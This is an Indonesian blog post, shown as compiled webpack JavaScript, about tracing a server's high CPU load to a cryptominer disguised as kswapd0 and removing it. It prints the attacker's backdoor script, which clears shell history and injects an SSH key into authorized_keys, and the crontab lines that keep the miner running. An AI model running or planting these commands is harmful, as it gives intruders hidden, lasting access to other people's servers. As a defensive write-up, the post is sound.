(window.webpackJsonp=window.webpackJsonp||[]).push([[18],{385:function(a,n,e){"use strict";e.r(n);var s=e(26),t=Object(s.a)({},(function(){var a=this,n=a.$createElement,e=a._self._c||n;return e("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[e("h1",{attrs:{id:"how-to-deal-with-high-cpu-usage-kswapd0-on-linux"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#how-to-deal-with-high-cpu-usage-kswapd0-on-linux"}},[a._v("#")]),a._v(" How to Deal With High CPU Usage kswapd0 on Linux")]),a._v(" "),e("Author",{attrs:{name:"Ryan Aunur Rassyid"}}),a._v(" "),e("FeaturedImage",{attrs:{src:"/images/covers/how-to-deal-with-kswapd0-on-linux.jpg",author:"Jase Bloor",source:"unsplash.com",sourceLink:"https://unsplash.com/photos/By1VMCg3K4I"}}),a._v(" "),e("h2",{attrs:{id:"introduction"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#introduction"}},[a._v("#")]),a._v(" Introduction")]),a._v(" "),e("p",[a._v("Beberapa waktu yang lalu penulis sempat menghandle Project yang menggunakan server fisik (bukan VPS). Server tersebut menggunakan Ubuntu 16.04 sebagai "),e("em",[a._v("Operating System")]),a._v("-nya. Namun OS yang dipakai tidak sama dengan OS yang penulis pakai setiap kali deploy VPS, padahal versi Ubuntu yang dipakai sama persis yaitu Ubuntu 16.04 tapi serasa seperti Debian. Banyak package package yang hilang atau tidak ada padahal package tersebut seharusnya ada di OS tersebut bahkan fresh install sekalipun.")]),a._v(" "),e("p",[a._v("Aplikasi berjalan baik dan tanpa kendala, hanya saja berjalan agak pelan untuk ukuran server dengan prosessor 8 core tersebut. Seharusnya aplikasi berjalan lebih baik bukan?. Oke mulai mulai dari sini mulai curiga. Apakah server menjalankan aplikasi lain yang menyebabkan aplikasi lain tidak memiliki cukup resource yang dipakai atau aplikasi yang kita kerjakan memang lamban. Akhirnya investigasi dimulai.")]),a._v(" "),e("h2",{attrs:{id:"table-of-contents"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#table-of-contents"}},[a._v("#")]),a._v(" Table of Contents")]),a._v(" "),e("p"),e("div",{staticClass:"table-of-contents"},[e("ul",[e("li",[e("a",{attrs:{href:"#introduction"}},[a._v("Introduction")])]),e("li",[e("a",{attrs:{href:"#table-of-contents"}},[a._v("Table of Contents")])]),e("li",[e("a",{attrs:{href:"#apa-itu-kswapd0"}},[a._v("Apa itu kswapd0?")]),e("ul",[e("li",[e("a",{attrs:{href:"#what-now"}},[a._v("What now?")])]),e("li",[e("a",{attrs:{href:"#menghapus-aplikasi"}},[a._v("Menghapus aplikasi")])]),e("li",[e("a",{attrs:{href:"#virus-total"}},[a._v("Virus Total")])])])]),e("li",[e("a",{attrs:{href:"#kesimpulan"}},[a._v("Kesimpulan")])])])]),e("p"),a._v(" "),e("h2",{attrs:{id:"apa-itu-kswapd0"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#apa-itu-kswapd0"}},[a._v("#")]),a._v(" Apa itu kswapd0?")]),a._v(" "),e("p",[a._v("Singkat cerita ditemukan akar masalahnya, yaitu aplikasi "),e("strong",[a._v("kswapd0")]),a._v(" yang berjalan menggunakan resource CPU 100% terus menerus. Ini sangat tidak wajar untuk aplikasi yang mengatur dan me-"),e("em",[a._v("manage")]),a._v(" SWAP atau virtual memory pada Linux. Karena ini hal baru yang belum pernah penulis jumpai selama memakai SWAP di Linux, jadi penulis mencoba mengumpulkan informasi dari semua forum-forum apa itu "),e("em",[a._v("kswapd0")]),a._v(" dan mengapa memakan resource CPU yang banyak.")]),a._v(" "),e("p",[a._v("Ada forum yang berpendapat bahwa kejadian ini adalah bug dari linux yang harusnya sudah di-fix di versi yang baru sedangkan ada beberapa orang berpendapat bahwa ini disebabkan oleh server yang menggunaakn hardisk dari pada SSD sebagai SWAP sehingga CPU dan Hardisk dipaksa bekerja dengan semaksimal mungkin. Team memutuskan untuk upgrade versi package yang kadarluasa dengan menjalankan "),e("code",[a._v("apt get upgrade")]),a._v(". Dan bener saja banyak package yang diupgrade pada waktu itu. Namun ini tidak menuntaskan masalah, "),e("strong",[a._v("kswapd0")]),a._v(" tetap berjalan.")]),a._v(" "),e("p",[e("img",{attrs:{src:"https://telegra.ph/file/2b542fc07f6a6a176c072.jpg",alt:"kswapd0 terlihat berjalan di aplikasi monitoring htop"}}),a._v(" "),e("em",[a._v("Aplikasi kswapd0 terlihat berjalan di aplikasi monitoring htop")])]),a._v(" "),e("h3",{attrs:{id:"what-now"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#what-now"}},[a._v("#")]),a._v(" What now?")]),a._v(" "),e("p",[a._v("Akhirnya kami putuskan untuk menghapus SWAP dari pada penggunaan CPU terus dipakai tanpa ampun. Setelah dihapus apakah masalah ini selesai? sayangnya tidak. Aplikasi tersebut masih berjalan bahkan tanpa adanya SWAP. Lalu apa sebenernya eksistensi dari aplikasi ini?. Akhirnya penulis putuskan untuk investigasi mendalam dan mencoba mengumpulkan informasi lagi di forum. Kali ini penulis mendapatkan secercah cahaya apa maksud dari semua ini. Setelah membaca log Cron Job yang mencurigakan akhirnya didapati pertanyaan yang related dengan masalah ini.")]),a._v(" "),e("a",{staticClass:"link-preview",attrs:{href:"https://askubuntu.com/questions/1161003/strange-cron-job-takes-up-100-of-cpu-ubuntu-18-lts-server",target:"_blank"}},[e("div",{staticClass:"link-preview--content"},[e("p",{staticClass:"title"},[a._v("Strange Cron Job takes up 100% of CPU Ubuntu 18 LTS Server - Ask Ubuntu")]),e("p",[a._v("I keep getting weir cron jobs showing up and I have no clue what they do. I typically issue kill -9  to stop them. They take up 100% of my CPU and can run for days until I check. Does anyone know w...")]),a._v(" "),e("p",[a._v("askubuntu.com")])]),e("div",{staticClass:"link-preview--thumbnail",staticStyle:{"background-image":"url(https://cdn.sstatic.net/Sites/askubuntu/Img/apple-touch-icon@2.png?v=c492c9229955)"}})]),e("p",[a._v("Usut punya usut ternyata aplikasi tersebut adalah aplikasi "),e("strong",[a._v("Crypto Mining")]),a._v(". Siapa sangka aplikasi ini bisa masuk pada sistem operasi linux yang baru di install. Aplikasi Crypto Mining sendiri adalah aplikasi yang menjalankan proses mining (memecahkan algoritma rumit) yang memerlukan sebuah resource khususnya CPU atau GPU. Keuntungan yang didapat dari mining adalah Cryptocurrency atau mata uang digital. Karena aplikasi ini berjalan tanpa izin dan dijalankan pada komputer atau server orang lain maka aplikasi ini termasuk tindakan yang merugikan orang lain. Aplikasi ini berjalan tanpa henti dan menggunakan semua resource CPU yang ada hingga 100% yang bisa memperpendek umur prosessor karena dipaksa melakukkan pekerjaan keras dalam waktu lama dan terus menerus.")]),a._v(" "),e("h3",{attrs:{id:"menghapus-aplikasi"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#menghapus-aplikasi"}},[a._v("#")]),a._v(" Menghapus aplikasi")]),a._v(" "),e("p",[a._v("Tidak ada faedahnya membuat aplikasi ini tetap berada di server. Alih alih membiarkan aplikasi tetap berjalan saya memilih untuk menghapus aplikasi ini. Sebelum itu saya lebih penasaran bagaimana aplikasi ini bisa masuk. Asumsi awal adalah aplikasi ini masuk dengan cara SCP atau transfer remote file melalui SSH. Kok bisa? bisa, karena di SSH folder "),e("code",[a._v("$HOME/.ssh/")]),a._v(" ada file "),e("code",[a._v("authorized_keys")]),a._v(" yang artinya orang bisa mengakses server kapan saja tanpa password karena Linux mempercayai sepenuhnya pelaku. Dan ini bisa terjadi karena OS yang di-install bukan dari OS resmi dari Ubuntu atau Debian dengan kata lain injected. File instalasi OS bisa saja di susupi script untuk membuat "),e("code",[a._v("authorized_keys")]),a._v(" seperti berikut.")]),a._v(" "),e("div",{staticClass:"language-bash extra-class"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("set")]),a._v(" +o "),e("span",{pre:!0,attrs:{class:"token function"}},[a._v("history")]),a._v("\n"),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("export")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token assign-left variable"}},[e("span",{pre:!0,attrs:{class:"token environment constant"}},[a._v("PATH")])]),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("/home/user/.bin:"),e("span",{pre:!0,attrs:{class:"token environment constant"}},[a._v("$PATH")]),a._v("\n"),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("cd")]),a._v(" ~ "),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("&&")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token function"}},[a._v("rm")]),a._v(" -rf .ssh "),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("&&")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token function"}},[a._v("mkdir")]),a._v(" .ssh "),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("&&")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("echo")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[a._v('"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"')]),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">>")]),a._v(".ssh/authorized_keys "),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("&&")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token function"}},[a._v("chmod")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[a._v("700")]),a._v(" .ssh "),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("&&")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("cd")]),a._v(" .ssh "),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("&&")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token function"}},[a._v("chmod")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[a._v("600")]),a._v(" authorized_keys "),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v("&&")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("cd")]),a._v(" ~\n")])])]),e("p",[a._v("Setelah pelaku sudah memiliki akses ke server kita melalui ssh, selanjutnya pelaku tinggal mengirim file mining tersebut ke server kita dan menjalankan nya dengan cron job. Kenapa cron job? karena disini aplikasi akan mendeteksi apakah aplikasi mining nya berjalan atau tidak. Apabila aplikasi dihentikan paksa dengan "),e("code",[a._v("kill -9 PID")]),a._v(" misalnya, maka aplikasi akan kembali berjalan setelah beberapa menit. Dan jika file aplikasi di hapus maka secara otomatis aplikasi akan di sync untuk mendapatkan file crypto mining dan menjalankannya kembali. Terdengar menarik bukan.")]),a._v(" "),e("div",{staticClass:"language-bash extra-class"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[e("span",{pre:!0,attrs:{class:"token number"}},[a._v("1")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[a._v("1")]),a._v(" */2 * * /home/user/.configrc/a/upd"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v("/dev/null "),e("span",{pre:!0,attrs:{class:"token operator"}},[e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[a._v("2")]),a._v(">")]),e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[a._v("&1")]),a._v("\n@reboot /home/user/.configrc/a/upd"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v("/dev/null "),e("span",{pre:!0,attrs:{class:"token operator"}},[e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[a._v("2")]),a._v(">")]),e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[a._v("&1")]),a._v("\n"),e("span",{pre:!0,attrs:{class:"token number"}},[a._v("5")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[a._v("8")]),a._v(" * * "),e("span",{pre:!0,attrs:{class:"token number"}},[a._v("0")]),a._v(" /home/user/.configrc/b/sync"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v("/dev/null "),e("span",{pre:!0,attrs:{class:"token operator"}},[e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[a._v("2")]),a._v(">")]),e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[a._v("&1")]),a._v("\n@reboot /home/user/.configrc/b/sync"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v("/dev/null "),e("span",{pre:!0,attrs:{class:"token operator"}},[e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[a._v("2")]),a._v(">")]),e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[a._v("&1")]),a._v("  \n"),e("span",{pre:!0,attrs:{class:"token number"}},[a._v("0")]),a._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[a._v("0")]),a._v(" */3 * * /tmp/.X25-unix/.rsync/c/aptitude"),e("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v("/dev/null "),e("span",{pre:!0,attrs:{class:"token operator"}},[e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[a._v("2")]),a._v(">")]),e("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[a._v("&1")]),a._v("\n")])])]),e("p",[a._v("Dan ini adalah struktur folder dari folder aplikasi tersebut disimpan "),e("code",[a._v("$HOME/.configrc")]),a._v(". Nama folder yang cukup meyakinkan untuk tidak di cek, karena kita akan berfikir bahwa folder ini mungkin bagian dari folder "),e("code",[a._v(".config")]),a._v(" yang hanya berisi config dari aplikasi-aplikasi di linux.")]),a._v(" "),e("div",{staticClass:"language- extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[a._v(".\n├── a\n│   ├── a\n│   ├── bash.pid\n│   ├── dir.dir\n│   ├── init0\n│   ├── kswapd0\n│   ├── run\n│   ├── stop\n│   └── upd\n├── b\n│   ├── a\n│   ├── dir.dir\n│   ├── run\n│   ├── stop\n│   └── sync\n├── cron.d\n└── dir2.dir\n")])])]),e("p",[a._v("Setelah aplikasi di berhentikan dan dihapus dari server, penggunaan resource CPU menjadi normal kembali. Untuk meyakinkan bahwa program tersebut sudah tidak aktif kembali dan semua file dan service sudah dihapus dan berhenti, kami menunggu untuk beberapa saat. Yes, aplikasi tidak berjalan kembali dan di monitoring system juga tidak nampak keanehan kembali.")]),a._v(" "),e("h3",{attrs:{id:"virus-total"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#virus-total"}},[a._v("#")]),a._v(" Virus Total")]),a._v(" "),e("p",[a._v("Kita pastikan kembali bahwa ini adalah aplikasi Crypto Mining dengan cara upload file "),e("strong",[a._v("kswapd0")]),a._v(" tersebut ke website "),e("a",{attrs:{href:"https://www.virustotal.com/gui/file/fd9007df08c1bd2cf47fb97443c4d7360e204f4d8fe48c5d603373b2b2975708/detection",target:"_blank",rel:"noopener noreferrer"}},[a._v("virustotal"),e("OutboundLink")],1),a._v(". Hasilnya dipastikan bahwa ini bukan file "),e("strong",[a._v("kswapd0")]),a._v(" yang asli atau bawaan Linux melainkan aplikasi Crypto Mining.")]),a._v(" "),e("p",[e("img",{attrs:{src:"https://telegra.ph/file/9c9b44a1073398b6c30a5.png",alt:"Hasil scan pada website VirusTotal.com"}}),a._v(" "),e("em",[a._v("Hasil scan pada website "),e("a",{attrs:{href:"https://www.virustotal.com/gui/file/fd9007df08c1bd2cf47fb97443c4d7360e204f4d8fe48c5d603373b2b2975708/detection",target:"_blank",rel:"noopener noreferrer"}},[a._v("VirusTotal.com"),e("OutboundLink")],1)])]),a._v(" "),e("h2",{attrs:{id:"kesimpulan"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#kesimpulan"}},[a._v("#")]),a._v(" Kesimpulan")]),a._v(" "),e("p",[a._v("Sebuah aplikasi yang menggunakan resource berlebih apalagi CPU perlu kita curigai dan usut sampai tuntas apa yang menyebabkan ia menggunakan CPU dengan tidak normal seperti itu. Dalam kasus ini aplikasi bernama "),e("strong",[a._v("kswapd0")]),a._v(" ini menjelma menjadi sebuah aplikasi yang cukup "),e("em",[a._v("make sense")]),a._v(" untuk menggunakan resource besar tapi "),e("em",[a._v("behavior")]),a._v(" dari aplikasi ini sendiri tidak seperti pada umunya.")]),a._v(" "),e("p",[a._v("Dari sini kita bisa mengambil pelajaran bahwa jangan langsung percaya dengan apa yang kita lihat. Sebelum ada bukti yang kuat kita tidak bisa mengatakan bahwa aplikasi ini baik baik saya dan berjalan sebagaimana mestinya. Bisa jadi aplikasi tersebut sedang menyamar menjadi aplikasi lain.")]),a._v(" "),e("Disqus")],1)}),[],!1,null,null,null);n.default=t.exports}}]);